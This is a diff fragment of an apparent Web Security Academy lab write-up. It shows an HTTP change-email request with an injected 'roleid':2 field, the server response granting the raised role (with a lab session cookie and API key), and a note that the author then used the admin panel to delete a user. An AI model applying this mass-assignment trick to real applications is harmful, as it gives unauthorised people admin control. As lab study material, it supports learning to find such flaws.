@@ -93,9 +93,24 @@ POST /my-account/change-email HTTP/2
 Host: 0a7500580392221783a1562900c000cd.web-security-academy.net
 Cookie: session=iPQ0ErMwPRiw62sGSCu6PFR3KuBnPyDi
 
-{"email":"test@gmail.com",
-"roleid":2}
+{
+	"email":"test@gmail.com",
+	"roleid":2
+}
+
+Response:
+
+{
+  "username": "wiener",
+  "email": "test@gmail.com",
+  "apikey": "NIuWYbiLFS0BC7pGohyj8OgmKQ1Lp10F",
+  "roleid": 2
+}
 ```
+
+now i get the access to admin panel and delete the user carlos.
+
+
 
 
 
